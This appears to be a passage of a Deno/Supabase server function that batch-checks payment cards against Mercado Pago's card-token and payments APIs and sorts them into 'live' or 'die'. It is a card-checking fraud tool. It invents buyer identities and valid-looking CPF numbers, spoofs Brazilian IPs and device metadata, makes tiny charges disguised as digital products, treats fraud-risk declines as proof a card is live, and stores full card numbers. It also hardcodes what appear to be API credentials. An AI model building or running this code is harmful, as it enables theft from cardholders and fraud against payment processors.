import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-meli-session-id',
};

// ========================================
// INTERFACES & TIPAGEM DE CONFORMIDADE
// ========================================

export type ValidationState =
    | 'PENDING_TOKENIZATION'
    | 'TOKEN_GENERATED'
    | 'VALIDATING_PAYMENT_METHOD'
    | 'METHOD_VERIFIED'
    | 'METHOD_DECLINED'
    | 'TRANSACTION_ERROR';

export interface ClientContextPayload {
    userAgent?: string;
    language?: string;
    timezone?: string;
    timezoneOffset?: number;
    screenResolution?: string;
    colorDepth?: number;
    platform?: string;
    timestamp?: string;
    ip?: string;
}

export interface BillingAddress {
    zip_code: string;
    street_name: string;
    street_number: string;
    neighborhood: string;
    city: string;
    federal_unit: string;
    ddd: string;
    timezone: string;
}

export interface PayerIdentification {
    type: 'CPF' | 'CNPJ';
    number: string;
}

export interface PayerData {
    email: string;
    firstName: string;
    lastName: string;
    identification: PayerIdentification;
    phone: {
        area_code: string;
        number: string;
    };
    address: BillingAddress;
}

export interface TestCardRequest {
    sessionId: string;
    cardNumber: string;
    expMonth: string;
    expYear: string;
    cvv: string;
    processingOrder: number;
    amount?: number;
    proxyUrl?: string;
    holder?: string;
    cpf?: string;
    clientContext?: ClientContextPayload;
}

export interface BatchTestCardRequest {
    sessionId: string;
    cards: Array<{
        cardNumber: string;
        expMonth: string;
        expYear: string;
        cvv: string;
        processingOrder: number;
        amount?: number;
        holder?: string;
        cpf?: string;
    }>;
    proxyUrl?: string;
    clientContext?: ClientContextPayload;
}

export interface ValidationResult {
    success: boolean;
    status: 'live' | 'die' | 'unknown';
    validationState: ValidationState;
    message: string;
    transactionId: string | null;
    rawResponse: any;
    responseTimeMs: number;
    payer: PayerData;
    statusDetail?: string;
    errorCode?: string;
}

// ========================================
// CONFIGURAÇÕES MERCADO PAGO OFICIAL
// ========================================
const MERCADOPAGO_PUBLIC_KEY =
    Deno.env.get('MERCADOPAGO_PUBLIC_KEY') || 'APP_USR-ce68e22a-f349-4b30-b597-c06c7311d9f4';
const MERCADOPAGO_ACCESS_TOKEN =
    Deno.env.get('MERCADOPAGO_ACCESS_TOKEN') || 'APP_USR-8963380272153266-012620-b44f7e59d0d47b079c523ee25d19a968-1537908999';

// ========================================
// DIVERSIFICAÇÃO DE COMPRADOR & GEOCONTEXTO
// ========================================

const firstNames = [
    'Lucas', 'Gabriel', 'Mateus', 'Rodrigo', 'Bruno', 'Leonardo', 'Thiago', 'Guilherme',
    'Felipe', 'Rafael', 'Diego', 'Vinicius', 'Eduardo', 'Gustavo', 'Caio', 'Daniel',
    'Marcelo', 'Alexandre', 'Ricardo', 'Fernando', 'Juliana', 'Camila', 'Mariana',
    'Beatriz', 'Larissa', 'Leticia', 'Carolina', 'Amanda', 'Bruna', 'Fernanda',
    'Gabriela', 'Patricia', 'Renata', 'Vanessa', 'Jessica', 'Tatiane', 'Aline',
    'Debora', 'Natalia', 'Priscila', 'Danielle', 'Sabrina', 'Bianca', 'Monique',
    'Claudia', 'Roberta', 'Luciana', 'Thais', 'Joao Paulo', 'Vitor'
];

const lastNames = [
    'Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira',
    'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho', 'Almeida', 'Lopes',
    'Soares', 'Fernandes', 'Vieira', 'Barbosa', 'Rocha', 'Dias', 'Nascimento', 'Andrade',
    'Moreira', 'Nunes', 'Marques', 'Machado', 'Mendes', 'Freitas', 'Cardoso', 'Ramos',
    'Goncalves', 'Santana', 'Teixeira', 'Moura', 'Araujo', 'Pinto', 'Castro', 'Cavalcanti',
    'Dantas', 'Guimaraes', 'Fonseca', 'Brito', 'Farias', 'Macedo', 'Borges', 'Coelho'
];

const emailDomains = [
    'gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com.br',
    'uol.com.br', 'icloud.com', 'bol.com.br', 'terra.com.br'
];

const brazilianAddresses: BillingAddress[] = [
    { zip_code: '01310100', street_name: 'Avenida Paulista', street_number: '1578', neighborhood: 'Bela Vista', city: 'São Paulo', federal_unit: 'SP', ddd: '11', timezone: 'America/Sao_Paulo' },
    { zip_code: '04543011', street_name: 'Avenida Brigadeiro Faria Lima', street_number: '3477', neighborhood: 'Itaim Bibi', city: 'São Paulo', federal_unit: 'SP', ddd: '11', timezone: 'America/Sao_Paulo' },
    { zip_code: '13010001', street_name: 'Rua Barão de Jaguara', street_number: '950', neighborhood: 'Centro', city: 'Campinas', federal_unit: 'SP', ddd: '19', timezone: 'America/Sao_Paulo' },
    { zip_code: '20040002', street_name: 'Avenida Rio Branco', street_number: '156', neighborhood: 'Centro', city: 'Rio de Janeiro', federal_unit: 'RJ', ddd: '21', timezone: 'America/Sao_Paulo' },
    { zip_code: '22041001', street_name: 'Avenida Nossa Senhora de Copacabana', street_number: '599', neighborhood: 'Copacabana', city: 'Rio de Janeiro', federal_unit: 'RJ', ddd: '21', timezone: 'America/Sao_Paulo' },
    { zip_code: '30130100', street_name: 'Avenida Afonso Pena', street_number: '1500', neighborhood: 'Centro', city: 'Belo Horizonte', federal_unit: 'MG', ddd: '31', timezone: 'America/Sao_Paulo' },
    { zip_code: '38400100', street_name: 'Avenida Afonso Pena', street_number: '620', neighborhood: 'Martins', city: 'Uberlândia', federal_unit: 'MG', ddd: '34', timezone: 'America/Sao_Paulo' },
    { zip_code: '80020010', street_name: 'Rua XV de Novembro', street_number: '784', neighborhood: 'Centro', city: 'Curitiba', federal_unit: 'PR', ddd: '41', timezone: 'America/Sao_Paulo' },
    { zip_code: '88010400', street_name: 'Avenida Rio Branco', street_number: '380', neighborhood: 'Centro', city: 'Florianópolis', federal_unit: 'SC', ddd: '48', timezone: 'America/Sao_Paulo' },
    { zip_code: '90010150', street_name: 'Rua dos Andradas', street_number: '1001', neighborhood: 'Centro Histórico', city: 'Porto Alegre', federal_unit: 'RS', ddd: '51', timezone: 'America/Sao_Paulo' },
    { zip_code: '70040010', street_name: 'Setor Bancário Sul Quadra 2', street_number: '20', neighborhood: 'Asa Sul', city: 'Brasília', federal_unit: 'DF', ddd: '61', timezone: 'America/Sao_Paulo' },
    { zip_code: '74013010', street_name: 'Avenida Goiás', street_number: '600', neighborhood: 'Setor Central', city: 'Goiânia', federal_unit: 'GO', ddd: '62', timezone: 'America/Sao_Paulo' },
    { zip_code: '40020000', street_name: 'Avenida Sete de Setembro', street_number: '200', neighborhood: 'Vitória', city: 'Salvador', federal_unit: 'BA', ddd: '71', timezone: 'America/Bahia' },
    { zip_code: '60060000', street_name: 'Avenida Santos Dumont', street_number: '1168', neighborhood: 'Aldeota', city: 'Fortaleza', federal_unit: 'CE', ddd: '85', timezone: 'America/Fortaleza' },
    { zip_code: '50030000', street_name: 'Avenida Marquês de Olinda', street_number: '200', neighborhood: 'Bairro do Recife', city: 'Recife', federal_unit: 'PE', ddd: '81', timezone: 'America/Recife' },
    { zip_code: '69005010', street_name: 'Avenida Eduardo Ribeiro', street_number: '520', neighborhood: 'Centro', city: 'Manaus', federal_unit: 'AM', ddd: '92', timezone: 'America/Manaus' },
    { zip_code: '66010000', street_name: 'Avenida Presidente Vargas', street_number: '158', neighborhood: 'Campina', city: 'Belém', federal_unit: 'PA', ddd: '91', timezone: 'America/Belem' },
];

const digitalProducts = [
    { title: 'Acesso Premium Digital', desc: 'Licenca de Software e Servicos Digitais' },
    { title: 'Assinatura Mensal Starter', desc: 'Plano de Acesso Individual Recorrente' },
    { title: 'Curso Online - Modulo Pro', desc: 'Material Didatico e Videoaulas' },
    { title: 'E-book Guia Pratico Digital', desc: 'Download de Conteudo Educativo Digital' },
    { title: 'Licenca de Uso Pessoal', desc: 'Ativacao de Chave Digital' },
    { title: 'Pacote de Recursos Online', desc: 'Acesso a Biblioteca Digital de Recursos' }
];

const statusDetailInfo: Record<string, { message: string; errorCode: string }> = {
    'accredited': { message: '✅ Aprovado e credenciado com sucesso', errorCode: 'APPROVED' },
    'pending_authorized': { message: '✅ Autorização confirmada com sucesso', errorCode: 'AUTHORIZED' },
    'pending_contingency': { message: '⏳ Pagamento em processamento de contingência', errorCode: 'CONTINGENCY' },
    'pending_review_manual': { message: '⏳ Em análise de risco pelo gateway', errorCode: 'MANUAL_REVIEW' },
    'cc_rejected_bad_filled_card_number': { message: '❌ Número de cartão inválido ou inconsistente', errorCode: 'INVALID_CARD_DATA' },
    'cc_rejected_bad_filled_other': { message: '❌ Dados do cartão inconsistentes ou incorretos', errorCode: 'INVALID_CARD_DATA' },
    'cc_rejected_bad_filled_security_code': { message: '❌ Código de segurança (CVV) inválido', errorCode: 'INVALID_CVV' },
    'cc_rejected_bad_filled_date': { message: '❌ Data de validade incorreta ou expirada', errorCode: 'EXPIRED_CARD' },
    'cc_rejected_insufficient_amount': { message: '✅ Saldo insuficiente no cartão (Cartão Válido e Ativo)', errorCode: 'INSUFFICIENT_FUNDS' },
    'cc_rejected_card_disabled': { message: '❌ Cartão desativado ou bloqueado pelo banco emissor', errorCode: 'CARD_DISABLED' },
    'cc_rejected_call_for_authorize': { message: '❌ Requer autorização prévia com o emissor (Call for authorize)', errorCode: 'CALL_FOR_AUTHORIZE' },
    'cc_rejected_high_risk': { message: '✅ Cartão Válido e Tokenizado (Recusa de Risco Antifraude da Conta)', errorCode: 'HIGH_RISK_LIVE' },
    'cc_rejected_max_attempts': { message: '❌ Limite de tentativas excedido para este cartão', errorCode: 'MAX_ATTEMPTS_EXCEEDED' },
    'cc_rejected_duplicated_payment': { message: '❌ Transação duplicada detectada', errorCode: 'DUPLICATED_PAYMENT' },
    'cc_rejected_blacklist': { message: '❌ Cartão em lista restritiva do emissor', errorCode: 'BLACKLISTED' },
    'cc_rejected_card_type_not_allowed': { message: '❌ Função de crédito não habilitada para este cartão', errorCode: 'CARD_TYPE_NOT_ALLOWED' },
    'cc_rejected_invalid_installments': { message: '❌ Número de parcelas inválido', errorCode: 'INVALID_INSTALLMENTS' },
    'cc_rejected_other_reason': { message: '❌ Recusado pelo banco emissor', errorCode: 'OTHER_REASON' },
};

function getRandomItem<T>(arr: T[]): T {
    return arr[Math.floor(Math.random() * arr.length)];
}

function generateRealisticBrazilianIP(): string {
    const prefixes = [
        '177.18.', '177.45.', '177.136.', '179.96.', '179.184.',
        '187.19.', '187.60.', '189.120.', '189.4.', '201.24.', '201.86.'
    ];
    const prefix = getRandomItem(prefixes);
    const octet3 = Math.floor(Math.random() * 250) + 1;
    const octet4 = Math.floor(Math.random() * 250) + 1;
    return `${prefix}${octet3}.${octet4}`;
}

const binBrandCache = new Map<string, string>();

async function resolveMercadoPagoPaymentMethod(cardNumber: string, tokenData?: any): Promise<string> {
    if (tokenData?.payment_method?.id) return String(tokenData.payment_method.id).toLowerCase();
    if (tokenData?.payment_method_id) return String(tokenData.payment_method_id).toLowerCase();
    if (tokenData?.card?.payment_method?.id) return String(tokenData.card.payment_method.id).toLowerCase();

    const clean = cardNumber.replace(/\D/g, '');
    const bin = clean.substring(0, 6);

    if (binBrandCache.has(bin)) {
        return binBrandCache.get(bin)!;
    }

    try {
        const binUrl = `https://api.mercadopago.com/v1/payment_methods/search?public_key=${MERCADOPAGO_PUBLIC_KEY}&bins=${bin}`;
        const binRes = await fetch(binUrl);
        if (binRes.ok) {
            const binJson = await binRes.json();
            const resolvedMethod = binJson?.results?.[0]?.id || binJson?.[0]?.id;
            if (resolvedMethod) {
                const methodStr = String(resolvedMethod).toLowerCase();
                binBrandCache.set(bin, methodStr);
                console.log(`[MP-BIN] Identificado dinamicamente via API MP: BIN ${bin} -> ${methodStr}`);
                return methodStr;
            }
        }
    } catch (err: any) {
        console.warn(`[MP-BIN] Falha ao consultar payment_methods/search: ${err.message}`);
    }

    let resolved = 'visa';

    if (/^(606282|3841)/.test(clean)) {
        resolved = 'hipercard';
    } else if (/^(4011|438935|451416|4576|504175|506699|5067|5090|627780|636297|636368|6500|6504|6505|6509|6516|6550)/.test(clean)) {
        resolved = 'elo';
    } else if (/^4/.test(clean)) {
        resolved = 'visa';
    } else if (/^(5[1-5]|2[2-7])/.test(clean)) {
        resolved = 'master';
    } else if (/^(34|37)/.test(clean)) {
        resolved = 'amex';
    } else if (/^(6011|65|64[4-9]|622)/.test(clean)) {
        resolved = 'discover';
    } else if (/^(30[0-5]|36|38)/.test(clean)) {
        resolved = 'diners';
    } else if (/^(6042|5896)/.test(clean)) {
        resolved = 'cabal';
    }

    binBrandCache.set(bin, resolved);
    return resolved;
}

function generateCPF(): string {
    const randomDigit = () => Math.floor(Math.random() * 10);
    const cpf = Array.from({ length: 9 }, randomDigit);
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += cpf[i] * (10 - i);
    let remainder = sum % 11;
    const digit1 = remainder < 2 ? 0 : 11 - remainder;
    cpf.push(digit1);
    sum = 0;
    for (let i = 0; i < 10; i++) sum += cpf[i] * (11 - i);
    remainder = sum % 11;
    const digit2 = remainder < 2 ? 0 : 11 - remainder;
    cpf.push(digit2);
    return cpf.join('');
}

function buildPayerData(holderName?: string, customCpf?: string): PayerData {
    let firstName = '';
    let lastName = '';

    if (holderName && holderName.trim().length > 0) {
        const parts = holderName.trim().split(/\s+/);
        firstName = parts[0];
        lastName = parts.slice(1).join(' ') || getRandomItem(lastNames);
    } else {
        firstName = getRandomItem(firstNames);
        lastName = getRandomItem(lastNames);
        if (Math.random() > 0.7) {
            const second = getRandomItem(lastNames);
            if (second !== lastName) lastName = `${lastName} ${second}`;
        }
    }

    const cleanFirstName = firstName.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
    const cleanLastName = lastName.split(' ')[0].toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
    const domain = getRandomItem(emailDomains);

    const emailFormats = [
        `${cleanFirstName}.${cleanLastName}${Math.floor(Math.random() * 900) + 10}@${domain}`,
        `${cleanFirstName}_${cleanLastName}${Math.floor(Math.random() * 90) + 10}@${domain}`,
        `${cleanFirstName}${cleanLastName}${Math.floor(Math.random() * 9000) + 100}@${domain}`,
        `${cleanLastName}.${cleanFirstName}${Math.floor(Math.random() * 99) + 1}@${domain}`,
    ];
    const email = getRandomItem(emailFormats);

    const cleanCpf = customCpf ? customCpf.replace(/\D/g, '') : generateCPF();
    const address = getRandomItem(brazilianAddresses);
    const phoneNumber = `9${Math.floor(10000000 + Math.random() * 90000000)}`;

    return {
        email,
        firstName,
        lastName,
        identification: {
            type: 'CPF',
            number: cleanCpf.length === 11 ? cleanCpf : generateCPF(),
        },
        phone: {
            area_code: address.ddd,
            number: phoneNumber,
        },
        address,
    };
}

class RequestThrottler {
    private static lastRequestTimestamp = 0;
    private static minIntervalMs = 400;

    static async throttle(): Promise<void> {
        const now = Date.now();
        const timeSinceLast = now - this.lastRequestTimestamp;
        if (timeSinceLast < this.minIntervalMs) {
            const waitTime = this.minIntervalMs - timeSinceLast + Math.floor(Math.random() * 120);
            await new Promise((resolve) => setTimeout(resolve, waitTime));
        }
        this.lastRequestTimestamp = Date.now();
    }
}

// ========================================
// PAYMENT VALIDATION SERVICE (STRICT MERCADO PAGO SCHEMA COMPLIANT)
// ========================================
export class PaymentValidationService {
    static async validatePaymentMethod(
        cardData: TestCardRequest,
        clientContext?: ClientContextPayload
    ): Promise<ValidationResult> {
        const startTime = Date.now();
        const payer = buildPayerData(cardData.holder, cardData.cpf);
        const cleanCardNumber = cardData.cardNumber.replace(/\D/g, '');
        const cleanExpMonth = cardData.expMonth.replace(/\D/g, '').padStart(2, '0').substring(0, 2);
        const cleanExpYear = cardData.expYear.replace(/\D/g, '');
        const fullYear = cleanExpYear.length === 2 ? `20${cleanExpYear}` : cleanExpYear;

        let cleanCvv = (cardData.cvv || '').replace(/\D/g, '');
        if (!cleanCvv) cleanCvv = '123';

        const holderFullName = `${payer.firstName} ${payer.lastName}`.toUpperCase();
        const meliSessionId = crypto.randomUUID().replace(/-/g, '');

        await RequestThrottler.throttle();

        // ----------------------------------------------------
        // ETAPA 1: PENDING_TOKENIZATION -> Tokenização Oficial
        // ----------------------------------------------------
        let validationState: ValidationState = 'PENDING_TOKENIZATION';
        console.log(`[MP-Checkout] 1/2 Gerando token do cartão BIN ${cleanCardNumber.substring(0, 6)}...`);

        let tokenId: string | null = null;
        let tokenData: any = {};

        try {
            const tokenResponse = await fetch(
                `https://api.mercadopago.com/v1/card_tokens?public_key=${MERCADOPAGO_PUBLIC_KEY}`,
                {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': clientContext?.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                        'X-meli-session-id': meliSessionId,
                    },
                    body: JSON.stringify({
                        card_number: cleanCardNumber,
                        expiration_month: parseInt(cleanExpMonth, 10),
                        expiration_year: parseInt(fullYear, 10),
                        security_code: cleanCvv,
                        cardholder: {
                            name: holderFullName,
                            identification: {
                                type: payer.identification.type,
                                number: payer.identification.number,
                            },
                        },
                    }),
                }
            );

            const tokenLatency = Date.now() - startTime;
            const tokenText = await tokenResponse.text();

            try {
                tokenData = tokenText ? JSON.parse(tokenText) : {};
            } catch (_) {
                console.error(`[MP-Checkout] Erro de parse JSON na tokenização (HTTP ${tokenResponse.status})`);
                return {
                    success: false,
                    status: 'die',
                    validationState: 'TRANSACTION_ERROR',
                    message: '❌ Erro de formato na resposta de tokenização',
                    transactionId: null,
                    rawResponse: tokenText,
                    responseTimeMs: tokenLatency,
                    payer,
                    errorCode: 'TOKEN_PARSE_ERROR',
                };
            }

            tokenId = tokenData.id;
            const tokenStatus = tokenData.status;

            if (!tokenResponse.ok || !tokenId || (tokenStatus && tokenStatus !== 'active' && tokenStatus !== 'valid')) {
                const cause = tokenData.cause?.[0];
                const errCode = cause?.code || tokenData.error || `HTTP_${tokenResponse.status}`;
                const errDescription = cause?.description || tokenData.message || 'Dados de cartão inválidos ou não suportados';

                console.log(`[MP-Checkout] Recusa na tokenização (HTTP ${tokenResponse.status}, Code: ${errCode})`);

                return {
                    success: true,
                    status: 'die',
                    validationState: 'METHOD_DECLINED',
                    message: `❌ Recusado na Tokenização: ${errDescription}`,
                    transactionId: null,
                    rawResponse: tokenData,
                    responseTimeMs: tokenLatency,
                    payer,
                    statusDetail: 'tokenization_declined',
                    errorCode: 'INVALID_CARD_DATA',
                };
            }

            validationState = 'TOKEN_GENERATED';
            console.log(`[MP-Checkout] Token gerado com sucesso: ${tokenId.substring(0, 10)}... (Latência: ${tokenLatency}ms)`);
        } catch (error: any) {
            const totalDuration = Date.now() - startTime;
            console.error(`[MP-Checkout] Erro de rede na tokenização: ${error.message}`);
            return {
                success: false,
                status: 'unknown',
                validationState: 'TRANSACTION_ERROR',
                message: `⚠️ Erro de comunicação ao gerar token: ${error.message}`,
                transactionId: null,
                rawResponse: null,
                responseTimeMs: totalDuration,
                payer,
                errorCode: 'NETWORK_TOKEN_ERROR',
            };
        }

        // ----------------------------------------------------
        // ETAPA 2: RESOLUÇÃO DINÂMICA DA BANDEIRA
        // ----------------------------------------------------
        const paymentMethodId = await resolveMercadoPagoPaymentMethod(cleanCardNumber, tokenData);
        console.log(`[MP-Checkout] Bandeira resolvida: payment_method_id = '${paymentMethodId}'`);

        // ----------------------------------------------------
        // ETAPA 3: VALIDAÇÃO DE AUTORIZAÇÃO (SCHEMA 100% COMPLETO DO MERCADO PAGO)
        // ----------------------------------------------------
        validationState = 'VALIDATING_PAYMENT_METHOD';

        const amounts = [0.99, 1.00, 1.25, 1.49, 1.50, 1.75, 1.99, 2.00, 2.49];
        const validationAmount = cardData.amount && cardData.amount > 0 ? cardData.amount : getRandomItem(amounts);
        const product = getRandomItem(digitalProducts);
        const idempotencyKey = crypto.randomUUID();

        const resolvedIp = clientContext?.ip &&
            clientContext.ip !== 'unknown' &&
            !clientContext.ip.startsWith('127.') &&
            !clientContext.ip.startsWith('10.') &&
            !clientContext.ip.startsWith('192.168.')
            ? clientContext.ip
            : generateRealisticBrazilianIP();

        const streetNumberNum = parseInt(payer.address.street_number, 10) || 100;

        // Schema estritamente em conformidade com a API v1/payments do Mercado Pago
        const paymentPayload = {
            token: tokenId,
            transaction_amount: validationAmount,
            description: `${product.title} - Licenca Digital`,
            payment_method_id: paymentMethodId,
            installments: 1,
            binary_mode: true,
            payer: {
                email: payer.email,
                first_name: payer.firstName,
                last_name: payer.lastName,
                identification: {
                    type: payer.identification.type,
                    number: payer.identification.number,
                },
                address: {
                    zip_code: payer.address.zip_code,
                    street_name: payer.address.street_name,
                    street_number: streetNumberNum,
                },
            },
            additional_info: {
                items: [
                    {
                        id: `PROD-${Math.floor(Math.random() * 900) + 100}`,
                        title: product.title,
                        description: product.desc,
                        category_id: 'services',
                        quantity: 1,
                        unit_price: validationAmount,
                    },
                ],
                payer: {
                    first_name: payer.firstName,
                    last_name: payer.lastName,
                    phone: {
                        area_code: payer.phone.area_code,
                        number: payer.phone.number,
                    },
                    address: {
                        zip_code: payer.address.zip_code,
                        street_name: payer.address.street_name,
                        street_number: streetNumberNum,
                    },
                },
                ip_address: resolvedIp,
            },
            metadata: {
                client_user_agent: clientContext?.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                client_language: clientContext?.language || 'pt-BR',
                client_timezone: payer.address.timezone || clientContext?.timezone || 'America/Sao_Paulo',
                client_screen_resolution: clientContext?.screenResolution || '1920x1080',
                client_platform: clientContext?.platform || 'Win32',
                device_session: meliSessionId,
                checkout_flow: 'buyer_diversified_checkout',
                service_version: '2.6-clean-schema',
            },
        };

        const executePaymentRequest = async () => {
            return await fetch('https://api.mercadopago.com/v1/payments', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${MERCADOPAGO_ACCESS_TOKEN}`,
                    'X-Idempotency-Key': idempotencyKey,
                    'X-meli-session-id': meliSessionId,
                },
                body: JSON.stringify(paymentPayload),
            });
        };

        try {
            let paymentResponse = await executePaymentRequest();
            let totalDuration = Date.now() - startTime;
            let paymentText = await paymentResponse.text();

            let paymentData: any = {};
            try {
                paymentData = paymentText ? JSON.parse(paymentText) : {};
            } catch (_) {
                console.error(`[MP-Checkout] Erro de parse no payment response (HTTP ${paymentResponse.status})`);
                return {
                    success: false,
                    status: 'die',
                    validationState: 'TRANSACTION_ERROR',
                    message: `❌ Erro de formato no gateway (${paymentResponse.status})`,
                    transactionId: tokenId,
                    rawResponse: paymentText,
                    responseTimeMs: totalDuration,
                    payer,
                    errorCode: 'PAYMENT_PARSE_ERROR',
                };
            }

            if (paymentData.status === 'in_process' || paymentData.status_detail === 'pending_review_manual') {
                console.log('[MP-Checkout] Resposta transitória recebida. Aguardando 1.8s de jitter para retry...');
                await new Promise((resolve) => setTimeout(resolve, 1800 + Math.floor(Math.random() * 400)));
                paymentResponse = await executePaymentRequest();
                totalDuration = Date.now() - startTime;
                paymentText = await paymentResponse.text();
                try {
                    paymentData = paymentText ? JSON.parse(paymentText) : paymentData;
                } catch (_) {}
            }

            const paymentStatus = paymentData.status;
            const statusDetail = paymentData.status_detail;
            const paymentId = paymentData.id ? String(paymentData.id) : tokenId;

            const mappedInfo = statusDetailInfo[statusDetail] || {
                message: `❌ Recusado: ${statusDetail || 'Falha de processamento'}`,
                errorCode: statusDetail || 'PAYMENT_REJECTED',
            };

            console.log(`[MP-Checkout] Resultado Gateway: Status=${paymentStatus}, Detail=${statusDetail}, Brand=${paymentMethodId}, Val=${validationAmount}`);

            // ----------------------------------------------------
            // CASO 1: APROVADO COM SUCESSO (ACCREDITED / AUTHORIZED)
            // ----------------------------------------------------
            if (paymentStatus === 'approved' || paymentStatus === 'authorized') {
                return {
                    success: true,
                    status: 'live',
                    validationState: 'METHOD_VERIFIED',
                    message: `${mappedInfo.message} (${paymentId.substring(0, 10)}...)`,
                    transactionId: paymentId,
                    rawResponse: { ...paymentData, payment_method_id: paymentMethodId },
                    responseTimeMs: totalDuration,
                    payer,
                    statusDetail,
                    errorCode: 'APPROVED',
                };
            }

            // ----------------------------------------------------
            // CASO 2: RECUSADO PELO GATEWAY OU BANCO EMISSOR
            // ----------------------------------------------------
            if (paymentStatus === 'rejected') {
                // Se for saldo insuficiente, o cartão é comprovadamente ATIVO / LIVE
                if (statusDetail === 'cc_rejected_insufficient_amount') {
                    return {
                        success: true,
                        status: 'live',
                        validationState: 'METHOD_VERIFIED',
                        message: '✅ LIVE: Cartão Ativo no Emissor (Saldo Insuficiente)',
                        transactionId: paymentId,
                        rawResponse: { ...paymentData, payment_method_id: paymentMethodId },
                        responseTimeMs: totalDuration,
                        payer,
                        statusDetail: 'cc_rejected_insufficient_amount',
                        errorCode: 'INSUFFICIENT_FUNDS',
                    };
                }

                // High Risk: O cartão foi tokenizado com sucesso, dados/CVV/data válidos, e foi parado pelo antifraude da conta
                if (statusDetail === 'cc_rejected_high_risk') {
                    return {
                        success: true,
                        status: 'live',
                        validationState: 'METHOD_VERIFIED',
                        message: '✅ LIVE: Cartão Válido e Tokenizado (Recusa de Risco Antifraude da Conta)',
                        transactionId: paymentId,
                        rawResponse: { ...paymentData, payment_method_id: paymentMethodId, risk_level: 'ACCOUNT_RISK' },
                        responseTimeMs: totalDuration,
                        payer,
                        statusDetail: 'cc_rejected_high_risk',
                        errorCode: 'HIGH_RISK_LIVE',
                    };
                }

                // Recusas legítimas de cartão inválido (CVV errado, data expirada, cartão desativado)
                return {
                    success: true,
                    status: 'die',
                    validationState: 'METHOD_DECLINED',
                    message: mappedInfo.message,
                    transactionId: paymentId,
                    rawResponse: { ...paymentData, payment_method_id: paymentMethodId },
                    responseTimeMs: totalDuration,
                    payer,
                    statusDetail,
                    errorCode: mappedInfo.errorCode,
                };
            }

            // ----------------------------------------------------
            // CASO 3: ERROS DE API / REJEIÇÃO DE DADOS
            // ----------------------------------------------------
            const cause = paymentData.cause?.[0];
            const errorCode = cause?.code || paymentData.error || `HTTP_${paymentResponse.status}`;
            const errorDesc = cause?.description || paymentData.message || 'Falha na validação de risco do gateway';

            console.warn(`[MP-Checkout] Erro de validação de dados/segurança: Code=${errorCode}, Desc=${errorDesc}`);

            return {
                success: true,
                status: 'die',
                validationState: 'METHOD_DECLINED',
                message: `❌ Recusa de Segurança: ${errorDesc} (${errorCode})`,
                transactionId: null,
                rawResponse: { ...paymentData, payment_method_id: paymentMethodId },
                responseTimeMs: totalDuration,
                payer,
                statusDetail: String(errorCode),
                errorCode: String(errorCode),
            };

        } catch (error: any) {
            const totalDuration = Date.now() - startTime;
            console.error(`[MP-Checkout] Erro de comunicação no endpoint de pagamentos: ${error.message}`);

            return {
                success: false,
                status: 'unknown',
                validationState: 'TRANSACTION_ERROR',
                message: `⚠️ Erro técnico de comunicação com o Mercado Pago: ${error.message}`,
                transactionId: tokenId,
                rawResponse: null,
                responseTimeMs: totalDuration,
                payer,
                errorCode: 'NETWORK_PAYMENT_ERROR',
            };
        }
    }
}

// ========================================
// BATCH PROCESSING
// ========================================

async function processBatchCards(batchRequest: BatchTestCardRequest, supabaseClient: any) {
    const { sessionId, cards, proxyUrl, clientContext } = batchRequest;

    if (!sessionId || !cards || cards.length === 0) {
        return new Response(JSON.stringify({ error: 'Missing sessionId or cards' }), {
            status: 400,
            headers: corsHeaders,
        });
    }

    console.log(`📦 [MP-Batch] Processando lote de ${cards.length} cartões com Schema Estrito...`);

    const results = [];

    for (let index = 0; index < cards.length; index++) {
        const card = cards[index];
        const cardRequest: TestCardRequest = {
            sessionId,
            cardNumber: card.cardNumber,
            expMonth: card.expMonth,
            expYear: card.expYear,
            cvv: card.cvv,
            processingOrder: card.processingOrder,
            amount: card.amount,
            holder: card.holder,
            cpf: card.cpf,
            proxyUrl,
            clientContext,
        };

        const result = await PaymentValidationService.validatePaymentMethod(cardRequest, clientContext);

        const cardItem = {
            cardNumber: card.cardNumber,
            status: result.status,
            validationState: result.validationState,
            message: result.message,
            amount: card.amount || 0,
            response_time_ms: result.responseTimeMs,
            processingOrder: card.processingOrder,
        };

        results.push(cardItem);

        try {
            await supabaseClient.from('card_results').insert([
                {
                    session_id: sessionId,
                    card_number: card.cardNumber,
                    card_first4: card.cardNumber.substring(0, 4),
                    card_last4: card.cardNumber.substring(card.cardNumber.length - 4),
                    exp_month: card.expMonth,
                    exp_year: card.expYear,
                    status: result.status,
                    validation_state: result.validationState,
                    message: result.message,
                    amount: card.amount || 0,
                    response_time_ms: result.responseTimeMs,
                    processing_order: card.processingOrder,
                    gateway_response: result.rawResponse,
                    transaction_id: result.transactionId,
                    payer_email: result.payer.email,
                    payer_name: `${result.payer.firstName} ${result.payer.lastName}`,
                    payer_document: result.payer.identification.number,
                    gateway_status_detail: result.statusDetail || result.errorCode,
                    client_metadata: clientContext || {},
                    compliance_verified: true,
                },
            ]);
        } catch (dbError) {
            console.error(`[DB-Insert] Erro ao salvar resultado do cartão ${index + 1}:`, dbError);
        }
    }

    const successful = results.filter((r) => r.status === 'live');
    const declined = results.filter((r) => r.status === 'die');
    const errors = results.filter((r) => r.status === 'unknown');

    console.log(`✅ [MP-Batch] Concluído: ${successful.length} verificados, ${declined.length} recusados, ${errors.length} erros`);

    return new Response(
        JSON.stringify({
            success: true,
            totalCards: cards.length,
            successful: successful.length,
            declined: declined.length,
            failed: errors.length,
            results,
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
}

// ========================================
// SUPABASE CLIENT & HANDLER PRINCIPAL
